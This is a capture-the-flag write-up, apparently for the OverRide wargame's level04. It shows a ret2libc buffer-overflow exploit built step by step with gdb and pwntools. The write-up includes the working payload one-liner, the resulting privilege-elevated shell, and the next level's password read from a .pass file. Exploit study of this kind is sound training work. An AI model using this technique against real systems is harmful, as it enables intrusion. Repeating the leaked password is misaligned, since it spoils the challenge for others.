@@ -1,0 +1,83 @@
+beacuse we cannot call exec we can try a ret2libc
+
+
+>>> from pwn import *
+>>> g = cyclic_gen()
+>>> g.get(300) 
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
+
+> gdb level04
+(gdb) set follow-fork-mode child
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04
+[New process 2464]
+Give me some shellcode, k
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2464]
+0x6261616f in ?? ()
+
+0x6261616f -> 'oaab'
+
+>>> g.find('oaab') 
+(156, 0, 156)
+
+
+offset = 156
+
+
+(gdb) i proc m
+process 2467
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+        0xf7e2b000 0xf7e2c000     0x1000        0x0
+        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+        0xf7fd0000 0xf7fd4000     0x4000        0x0
+        0xf7fda000 0xf7fdb000     0x1000        0x0
+        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+
+
+(gdb) i fun system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+
+
+now we have an offset of 156, /bin/sh at 0xf7f897ec and system at 0xf7e6aed0
+
+level04@OverRide:~$ python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7')" > /tmp/e
+level04@OverRide:~$ cat /tmp/e - | ./level04
+Give me some shellcode, k
+sh: 1: : not found
+
+this errors occours when the argument is not passed in the correct spot, so we can add padding:
+
+level04@OverRide:~$ python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + 'A' * 4 + '\xec\x97\xf8\xf7')" > /tmp/e
+level04@OverRide:~$ cat /tmp/e - | ./level04
+Give me some shellcode, k
+id
+uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
